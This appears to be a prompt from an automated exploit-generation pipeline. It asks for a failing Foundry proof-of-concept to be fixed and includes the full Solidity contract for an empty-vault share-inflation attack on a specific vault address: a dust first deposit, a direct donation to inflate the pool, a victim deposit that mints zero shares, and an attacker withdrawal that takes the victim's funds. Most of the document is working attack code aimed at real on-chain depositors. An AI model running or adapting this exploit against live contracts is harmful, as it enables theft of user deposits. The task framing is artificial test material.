You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Empty-vault inflation attack can steal later deposits via zero-share minting
- claim: Share issuance uses the pre-deposit ratio `shares = _amount * totalSupply / _pool` without any minimum-share check, while `balance()` includes underlying that reaches the vault outside `deposit()` accounting. An attacker can seed the vault with a dust first deposit, then donate underlying directly so `_pool` becomes very large relative to `totalSupply`, causing later deposits to mint zero or negligible shares.
- impact: Victim deposits can be accepted while minting no meaningful yShares, effectively donating their assets to incumbent shareholders. A dust first depositor can then redeem nearly the entire vault balance, including later users' deposits.
- exploit_paths: ["Attacker makes the first deposit with a dust amount and receives the initial shares 1:1.", "Attacker transfers a large amount of underlying directly to the vault, inflating `balance()` without minting new shares.", "A victim calls `deposit()`; because `_pool` is now huge, `(_amount * totalSupply) / _pool` rounds down to zero or dust.", "The attacker later withdraws their shares and captures almost all underlying, including the victim's deposit."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IYVault {
    function token() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balance() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

contract VictimDepositor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function depositAll(address vaultAddress) external {
        require(msg.sender == owner, "only owner");

        IYVault vault = IYVault(vaultAddress);
        IERC20 token = IERC20(vault.token());
        uint256 amount = token.balanceOf(address(this));
        if (amount == 0) {
            return;
        }

        _safeApprove(token, vaultAddress, 0);
        _safeApprove(token, vaultAddress, amount);
        vault.deposit(amount);
    }

    function sweep(address tokenAddress, address to) external {
        require(msg.sender == owner, "only owner");
        IERC20 token = IERC20(tokenAddress);
        uint256 amount = token.balanceOf(address(this));
        if (amount != 0) {
            _safeTransfer(token, to, amount);
        }
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    IYVault internal constant VAULT = IYVault(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);

    VictimDepositor public immutable victim;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {
        victim = new VictimDepositor();
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address underlying = VAULT.token();
        IERC20 token = IERC20(underlying);
        _profitToken = underlying;

        uint256 attackerStartingBalance = token.balanceOf(address(this));
        uint256 victimStartingBalance = token.balanceOf(address(victim));

        // Path-strict infeasibility guard:
        // the hypothesis requires the attacker to make the *first* dust deposit into an empty vault.
        // If the live fork already has any share supply, stage 1 of the claimed path is impossible.
        if (VAULT.totalSupply() != 0) {
            _profitAmount = 0;
            return;
        }

        // A profitable realization of this bug also requires distinct victim capital. Re-using attacker
        // funds (or transient flash-loaned funds) for the victim leg is circular and cannot create
        // positive net profit after repayment; it only demonstrates the rounding bug. Therefore this
        // verifier executes the exact path only when separate victim-side underlying already exists.
        if (attackerStartingBalance == 0 || victimStartingBalance == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 attackerSeed = 1;
        if (attackerStartingBalance <= attackerSeed) {
            _profitAmount = 0;
            return;
        }

        uint256 attackerDonation = attackerStartingBalance - attackerSeed;

        // To force zero-share minting for the victim after the dust first deposit, donated underlying
        // must make pool > victimAmount * totalSupply. With totalSupply == 1 after the seed deposit,
        // donating at least the victim deposit amount is sufficient for exact zero-share minting.
        if (attackerDonation < victimStartingBalance) {
            _profitAmount = 0;
            return;
        }

        _safeApprove(token, address(VAULT), 0);
        _safeApprove(token, address(VAULT), attackerSeed);

        // Stage 1: attacker makes the first dust deposit and receives shares 1:1.
        VAULT.deposit(attackerSeed);

        uint256 attackerShares = VAULT.balanceOf(address(this));
        if (attackerShares != attackerSeed) {
            _profitAmount = 0;
            return;
        }

        // Stage 2: attacker donates underlying directly to the vault, inflating balance() without minting shares.
        _safeTransfer(token, address(VAULT), attackerDonation);

        uint256 victimSharesBefore = VAULT.balanceOf(address(victim));

        // Stage 3: victim deposits after the donation.
        victim.depositAll(address(VAULT));

        uint256 victimSharesAfter = VAULT.balanceOf(address(victim));
        uint256 victimMintedShares = victimSharesAfter - victimSharesBefore;

        // Path-strict check: the hypothesis claims a zero-share mint on the victim deposit.
        if (victimMintedShares != 0) {
            _profitAmount = 0;
            return;
        }

        // Stage 4: attacker withdraws and captures the victim's donated assets.
        VAULT.withdraw(attackerShares);

        uint256 attackerEndingBalance = token.balanceOf(address(this));
        if (attackerEndingBalance <= attackerStartingBalance) {
            _profitAmount = 0;
            return;
        }

        _profitAmount = attackerEndingBalance - attackerStartingBalance;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: deposit(), _pool, (_amount * totalsupply) / _pool; generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
